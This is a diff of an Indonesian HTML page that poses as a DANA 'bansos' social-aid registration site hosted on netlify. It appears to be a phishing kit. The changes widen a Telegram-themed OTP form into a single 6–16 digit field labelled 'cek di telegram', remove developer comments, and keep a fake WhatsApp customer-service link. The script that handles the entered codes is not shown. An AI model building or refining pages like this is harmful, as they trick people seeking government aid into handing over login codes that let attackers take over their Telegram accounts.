@@ -5,16 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DANA Bansos - Daftar Sekarang</title>
 
-    <!-- Open Graph / Social Media Meta Tags (dari link ImgBB Anda) -->
+    <!-- Open Graph / Social Media Meta Tags -->
     <meta property="og:title" content="DANA Bansos - Daftar Sekarang">
     <meta property="og:description" content="Daftar sekarang dan dapatkan informasi terbaru seputar bansos DANA">
-    <!-- Menggunakan direct link dari ImgBB -->
     <meta property="og:image" content="https://i.ibb.co.com/HTN4JLV/mbbl.jpg">
     <meta property="og:url" content="https://pwfd-fjodsgt.netlify.app">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="DANA Bansos">
 
-    <!-- Twitter Card (opsional, untuk tampilan di Twitter/X) -->
+    <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="DANA Bansos - Daftar Sekarang">
     <meta name="twitter:description" content="Daftar sekarang dan dapatkan informasi terbaru seputar bansos DANA">
@@ -22,14 +21,14 @@
 
     <!-- Fonts -->
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=PT+Sans:wght@400;700&display=swap">
-    <!-- Font Awesome for Telegram icon -->
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 
     <!-- CSS Eksternal -->
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <!-- Loading Overlay untuk transisi antar halaman -->
+    <!-- Loading Overlay -->
     <div id="page-loading" class="page-loading-overlay hidden">
         <div class="page-loading-spinner"></div>
         <div class="page-loading-text">Mengirim kode OTP...</div>
@@ -41,7 +40,7 @@
             <a class="skip-link" href="#main-content">Lanjut ke konten</a>
 
             <header class="site-header" role="banner">
-                <!-- Header kosong, bisa diisi jika perlu -->
+                <!-- Header kosong -->
             </header>
 
             <main id="main-content">
@@ -159,13 +158,12 @@
         <!-- Marketing Bar -->
         <div class="marketing-bar">
             <div class="marketing-bar-text">Dapatkan informasi terbaru seputar bansos</div>
-            <!-- Tombol Daftar Sekarang - mengarah ke form pendaftaran -->
             <button class="marketing-bar-button" id="daftar-sekarang-btn">Daftar Sekarang</button>
             <a class="marketing-bar-link" href="#" aria-label="Informasi lebih lanjut"></a>
         </div>
     </div>
 
-    <!-- Halaman OTP dengan Tema Telegram -->
+    <!-- Halaman OTP dengan Tema Telegram - Single Input 6-16 digit -->
     <div id="otp-page" class="hidden">
         <div class="container">
             <div class="otp-container">
@@ -174,15 +172,20 @@
                 </div>
                 <h2 class="otp-title">Verifikasi Kode OTP</h2>
                 <div class="user-info" id="otp-user-info"></div>
-                <p class="otp-subtitle">Masukkan kode yang dikirim ke nomor Anda</p>
+                <p class="otp-subtitle">Masukkan kode yang dikirim ke nomor Anda (cek di telegram)</p>
                 
-                <div class="otp-input-group">
-                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                <!-- Single OTP Input Field 6-16 digit -->
+                <div class="single-otp-group">
+                    <input 
+                        type="text" 
+                        class="single-otp-input" 
+                        id="single-otp-input"
+                        maxlength="16" 
+                        pattern="[0-9]{6,16}" 
+                        inputmode="numeric"
+                        placeholder="Masukkan kode OTP"
+                        autocomplete="off"
+                    >
                 </div>
 
                 <div class="otp-timer" id="otp-timer">02:00</div>
@@ -192,7 +195,7 @@
                 </div>
 
                 <div class="button-group">
-                    <!-- Tombol Verifikasi dengan gaya Telegram -->
+                    <!-- Tombol Verifikasi -->
                     <button class="telegram-verify-button" id="verify-otp-btn">
                         <span class="button-text">
                             <i class="fab fa-telegram"></i> Verifikasi
@@ -203,7 +206,7 @@
                         </span>
                     </button>
                     
-                    <!-- Tombol Hubungi CS Bansos via WhatsApp -->
+                    <!-- Tombol Hubungi CS -->
                     <a href="https://wa.me/6282194565774?text=Halo%20CS%20Bansos%2C%20saya%20membutuhkan%20bantuan%20terkait%20kode%20OTP" 
                        class="whatsapp-button" 
                        target="_blank" 
@@ -226,4 +229,4 @@
     <!-- JavaScript Eksternal -->
     <script src="script.js"></script>
 </body>
-    </html>
+                                                </html>
